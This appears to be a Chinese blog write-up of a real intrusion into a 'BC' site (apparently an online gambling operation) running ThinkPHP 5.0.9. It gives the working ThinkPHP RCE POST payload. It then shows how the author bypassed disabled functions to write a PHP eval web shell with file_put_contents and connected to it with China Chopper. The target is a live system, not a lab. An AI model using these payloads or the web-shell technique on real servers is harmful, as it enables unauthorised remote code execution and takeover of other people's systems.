最近来了点任务，做BC站，以前没做过只能碰碰运气！

**确定目标**  
主站：

![](../Images/75b9de1218468096058c1e676977b844.png)

  

通过旁站：  

![](../Images/5fe02dfe9888abd4add4ea2dd6860625.png)

  

**信息收集**  
通过信息收集发现是个tp v5.0.9，此版本存在tp-rce漏洞。  

![](../Images/504ade8866c9045ec580243202c7869b.png)

  

直接通过payload进行测试，  

```

Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()
```

查找payload，直接打：

Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()

![](../Images/619503b1784ec891f2f1ce88f9edacf4.png)

发现是php 5.4.45版本的，

直接尝试getshell：

![](../Images/0ae2413dc30cc1160f4ce2bd63cd9cf1.png)

发现system被禁用，尝试其他系统命令的也一样。

![](../Images/3117b2c98acfc206afd53c8f43b0f07d.png)

查看phpinfo中desable\_functions禁用了那些函数。

![](../Images/3117b2c98acfc206afd53c8f43b0f07d.png)

想办法怎么绕过进行写马（此处卡了我半天）  
最后通过一位渗透小伙伴，想出下面的可以利用file\_put\_contents直接写shell，想了半天，忘了用其他函数进行直接写马就可以了，并不需要非得利用system命令进行写马，还是底层知识薄弱啊。再次感谢小伙伴！

![](../Images/ecd0494c86fa5e855a1f8bddf99f6df5.png)

  

**getshell**  
构造payload：  

```
\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=file\_put\_contents('a.php','<?php eval($\_POST\[a\])?>')

```

  

![](../Images/029b95a80ae49c8b2dac6e6a220ef1ba.png)

写入成功，利用菜刀连接。

![](../Images/09aa3943049915cfe5ff4cc6c89b0ee6.png)

成功连接。  
查看权限：

![](../Images/1cb146988829c1b70030769eeb297418.png)

发现启动了远程安全模式。  
想要绕过，发现很多函数被禁用，占未成功。
